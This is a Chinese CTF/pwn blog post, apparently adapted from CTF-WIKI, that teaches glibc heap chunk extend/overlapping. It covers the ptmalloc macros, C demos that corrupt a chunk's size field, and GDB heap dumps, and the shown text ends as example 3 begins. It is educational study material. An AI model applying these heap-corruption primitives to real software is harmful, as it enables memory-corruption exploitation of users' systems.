<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Chunk Extend/Overlapping | 堆拓展、重叠 | SkYe231 Blog</title><meta name="keywords" content="fini_array,chunk extend,chunk overlapping"><meta name="author" content="SkYe231"><meta name="copyright" content="SkYe231"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="堆拓展&amp;溢出 绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录  介绍chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：  程序中存在基于堆的漏洞 漏洞可以控制 chunk header 中的数据  原理chunk extend 技术能够产生的原因在于 ptmalloc">
<meta property="og:type" content="article">
<meta property="og:title" content="Chunk Extend&#x2F;Overlapping | 堆拓展、重叠">
<meta property="og:url" content="https://www.mrskye.cn/archives/d269f0ac/index.html">
<meta property="og:site_name" content="SkYe231 Blog">
<meta property="og:description" content="堆拓展&amp;溢出 绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录  介绍chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：  程序中存在基于堆的漏洞 漏洞可以控制 chunk header 中的数据  原理chunk extend 技术能够产生的原因在于 ptmalloc">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.mrskye.cn/img/default_cover5.jpg">
<meta property="article:published_time" content="2020-08-05T07:29:00.000Z">
<meta property="article:modified_time" content="2021-04-06T05:24:50.215Z">
<meta property="article:author" content="SkYe231">
<meta property="article:tag" content="fini_array">
<meta property="article:tag" content="chunk extend">
<meta property="article:tag" content="chunk overlapping">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.mrskye.cn/img/default_cover5.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://www.mrskye.cn/archives/d269f0ac/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?8184ae9371af7cedfa47d27c247e16b8";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-154693872-1"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-154693872-1');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"这篇文章距离上次更新已经","messageNext":"天，内容可能已经过时了。"},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":200,"languages":{"author":"作者: SkYe231","link":"链接: ","source":"来源: SkYe231 Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Chunk Extend/Overlapping | 堆拓展、重叠',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-04-06 13:24:50'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/font_2567732_2yo06945456.css"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="SkYe231 Blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">105</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">145</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-wrench"></i><span> 工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="http://mrskye.gitee.io/cyberchef/"><i class="fa-fw fas fa-key"></i><span> cyberchef</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://travellings.now.sh/"><i class="fa-fw fas fa-subway"></i><span> 开往</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default_cover5.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">SkYe231 Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-wrench"></i><span> 工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="http://mrskye.gitee.io/cyberchef/"><i class="fa-fw fas fa-key"></i><span> cyberchef</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://travellings.now.sh/"><i class="fa-fw fas fa-subway"></i><span> 开往</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Chunk Extend/Overlapping | 堆拓展、重叠</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-05T07:29:00.000Z" title="发表于 2020-08-05 15:29:00">2020-08-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-04-06T05:24:50.215Z" title="更新于 2021-04-06 13:24:50">2021-04-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>27分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Chunk Extend/Overlapping | 堆拓展、重叠"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="堆拓展-amp-溢出"><a href="#堆拓展-amp-溢出" class="headerlink" title="堆拓展&amp;溢出"></a>堆拓展&amp;溢出</h1><blockquote>
<p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p>
</blockquote>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p>
<ul>
<li>程序中存在基于堆的漏洞</li>
<li>漏洞可以控制 chunk header 中的数据</li>
</ul>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p>
<p>在 ptmalloc 中，<strong>获取 chunk 块大小</strong>的操作如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure>

<p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p>
<p>在 ptmalloc 中，<strong>获取下一 chunk 块地址</strong>的操作如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure>

<p>即使用当前块指针加上当前块大小。</p>
<p>在 ptmalloc 中，<strong>获取前一个 chunk 信息</strong>的操作如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure>

<p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。</p>
<p>在 ptmalloc，<strong>判断当前 chunk 是否是 use 状态</strong>的操作如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure>

<p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p>
<p>更多的操作详见 <code>堆相关数据结构</code> 一节。</p>
<p>通过上面几个宏可以看出，<em>ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位</em>。简而言之，<strong>chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的</strong>。</p>
<p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。这里只介绍 chunk extend 的利用。</p>
<blockquote>
<p><strong>以下示例代码，谨慎加入 printf 等函数，因为程序没有初始化缓冲区，如果引入这些函数的话，程序会创建一个堆用作缓存</strong></p>
</blockquote>
<h2 id="基本示例-1：对-inuse-的-fastbin-进行-extend"><a href="#基本示例-1：对-inuse-的-fastbin-进行-extend" class="headerlink" title="基本示例 1：对 inuse 的 fastbin 进行 extend"></a>基本示例 1：对 inuse 的 fastbin 进行 extend</h2><p>简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。 <strong>注意，我们的示例都是在 64 位的程序。如果想在 32 位下进行测试，可以把 8 字节偏移改为 4 字节</strong>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当两个 malloc 语句执行之后，堆的内存分布如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<p>之后，我们把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为 0x40。在题目中这一步可以由堆溢出得到。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== 篡改大小</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 </span><br></pre></td></tr></table></figure>

<p>执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Fastbins[idx=0, size=0x10] 0x00</span><br><span class="line">Fastbins[idx=1, size=0x20] 0x00</span><br><span class="line">Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) </span><br><span class="line">Fastbins[idx=3, size=0x40] 0x00</span><br><span class="line">Fastbins[idx=4, size=0x50] 0x00</span><br><span class="line">Fastbins[idx=5, size=0x60] 0x00</span><br><span class="line">Fastbins[idx=6, size=0x70] 0x00</span><br></pre></td></tr></table></figure>

<p>之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call   <span class="number">0x400450</span> &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line">mov    QWORD PTR [rbp<span class="number">-0x8</span>], rax</span><br><span class="line"></span><br><span class="line">rax = <span class="number">0x602010</span></span><br></pre></td></tr></table></figure>

<h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p>因为 fastbin 追求效率，安全校验机制弱，free 时找到 fastbin 链表中对应大小链表就放入了。prev_inuse 等不会校验。物理地址相邻的空闲 fastbin 不会合并。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-01-jG6JPvPb6JSupFko.png">[^1]</p>
<p>[^1]: fastbin 不与物理地址相邻 fastbin 合并，不与 top chunk 合并</p>
<h2 id="基本示例-2：对-inuse-的-smallbin-进行-extend"><a href="#基本示例-2：对-inuse-的-smallbin-进行-extend" class="headerlink" title="基本示例 2：对 inuse 的 smallbin 进行 extend"></a>基本示例 2：对 inuse 的 smallbin 进行 extend</h2><p>通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。 以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是 0x70）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并的chunk3</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;&#x3D;&#x3D;&#x3D;chunk1 篡改size域</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D; chunk2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D; 防止合并的chunk</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;&#x3D;&#x3D;&#x3D; top chunk</span><br></pre></td></tr></table></figure>

<p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin ，chunk3 prev_size 写入 0xb0 ，prev_inuse 为 0 ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;&#x3D;&#x3D;&#x3D; 被放入unsorted bin</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x00000000000000b0  0x0000000000000020 &lt;&#x3D;&#x3D;&#x3D; 注意此处标记为空</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;&#x3D;&#x3D;&#x3D; top chunk</span><br><span class="line">[+] unsorted_bins[0]: fw&#x3D;0x602000, bk&#x3D;0x602000</span><br><span class="line"> →   Chunk(addr&#x3D;0x602010, size&#x3D;0xb0, flags&#x3D;PREV_INUSE)</span><br></pre></td></tr></table></figure>

<p>再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    0x4005b0 &lt;main+74&gt;        call   0x400450 &lt;malloc@plt&gt;</span><br><span class="line">→   0x4005b5 &lt;main+79&gt;        mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line"></span><br><span class="line">    rax : 0x0000000000602010</span><br></pre></td></tr></table></figure>

<h2 id="基本示例-3：对-free-的-smallbin-进行-extend"><a href="#基本示例-3：对-free-的-smallbin-进行-extend" class="headerlink" title="基本示例 3：对 free 的 smallbin 进行 extend"></a>基本示例 3：对 free 的 smallbin 进行 extend</h2><p>示例 3 是在示例 2 的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的 size 域。</p>
